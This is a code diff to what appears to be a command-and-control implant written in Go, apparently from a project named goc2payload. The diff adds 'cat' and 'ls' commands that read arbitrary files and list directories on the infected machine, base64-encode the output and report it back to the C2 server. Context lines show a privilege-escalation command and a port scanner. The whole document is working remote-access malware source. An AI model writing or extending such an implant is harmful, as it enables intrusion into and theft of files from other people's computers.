@@ -20,6 +20,8 @@ import (
 	"strings"
 	"time"
 
+	"github.com/grines/goc2payload/agent_code/ls"
+
 	"github.com/JustinTimperio/gomap"
 	"github.com/lithammer/shortuuid"
 )
@@ -118,7 +120,7 @@ int main(int argc, char *argv[]) {
 }
 `
 
-func Build(c2server string) {
+func Builder(c2server string) {
 
 	c2 = c2server
 
@@ -214,8 +216,27 @@ func runCommand(commandStr string, cmdid string) error {
 		sEnc := base64.StdEncoding.EncodeToString([]byte(data))
 		updateCmdStatus(cmdid, sEnc)
 		return nil
-	case "clipboard":
-		print("clipboard")
+	case "cat":
+		if len(arrCommandStr) == 1 {
+			data := "missing path to file"
+			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
+			updateCmdStatus(cmdid, sEnc)
+			return errors.New("missing path to file")
+		}
+		data := cat(arrCommandStr[1])
+		sEnc := base64.StdEncoding.EncodeToString([]byte(data))
+		updateCmdStatus(cmdid, sEnc)
+	case "ls":
+		var path string
+		if len(arrCommandStr) == 1 {
+			path = "./"
+		} else {
+			path = arrCommandStr[1]
+		}
+		list := ls.List(path)
+		result := strings.Join(list, "\n")
+		sEnc := base64.StdEncoding.EncodeToString([]byte(result))
+		updateCmdStatus(cmdid, sEnc)
 	case "privesc":
 		if len(arrCommandStr) == 1 {
 			data := "Required 1 arguments (privesc type)"
@@ -443,4 +464,14 @@ func portscan() string {
 		// handle error
 	}
 	return scan.String()
+}
+
+func cat(filename string) string {
+	data, err := ioutil.ReadFile(filename)
+	if err != nil {
+		fmt.Println("File reading error", err)
+		return "Error reading file " + filename
+	}
+	fmt.Println("Contents of file:", string(data))
+	return string(data)
 }
